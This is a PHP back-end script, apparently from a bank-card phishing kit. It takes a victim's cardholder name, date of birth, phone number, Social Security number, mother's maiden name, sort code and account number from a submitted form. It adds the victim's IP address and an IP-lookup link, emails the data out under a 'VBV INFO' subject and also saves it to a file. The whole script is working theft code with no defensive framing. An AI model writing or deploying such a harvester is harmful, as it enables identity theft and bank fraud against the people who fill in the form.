<?php
include 'config.php';
        $ip = getenv("REMOTE_ADDR");
   if (isset($_POST['holder'])) {
        $_SESSION['user'] = $xholder = $_POST['holder'];
        $XPhone = $_POST['phone_number'];
   }
        $message.= "=======================================================\n";
		$message.= "Card Holder  :  ".$xholder."      \n";
		$message.= "Date of Birth  :  ".$_POST['dob_1']."-".$_POST['dob_2']."-".$_POST['dob_3']."       \n";
		$message.= "Phone Number  :  ".$XPhone."      \n";
		   if (isset($_POST['ssn_1'])) {
		$message.= "Social Security Number  :  ".$_POST['ssn_1']."-".$_POST['ssn_2']."-".$_POST['ssn_3']."      \n";
		        }
		   if (isset($_POST['mmn'])) {
		$mmn = $_POST['mmn'];
		$message.= "Mother Middle Name  :  ".$mmn."      \n";
			    }
	       if (isset($_POST['sort_1'])) {
		$message.= "Sort Code  :  ".$_POST['sort_1']."-".$_POST['sort_2']."-".$_POST['sort_3']."      \n";
		        }
		   if (isset($_POST['acc_num'])) {
		$accnum = $_POST['acc_num'];
		$message.= "Account Number  :  ".$accnum."      \n";
		        }
        $message.= "=======================================================\n";
        $message.= "Client IP  :  ".$ip."           \n";
        $message.= "IP Link  :  http://ip-api.com/#".$ip."\n";
        $message.= "=======================================================\n";
        $subject = " VBV INFO-- [ $ip ] - [$XPhone] ";
        $headers = "From: Hamalt.iq <hamalt.iq@gmail.com>\r\n";
        mail($email,$subject,$message,$headers);
        fwrite($file,$message);
        fclose($file);
		echo 'success_no_tl';

?>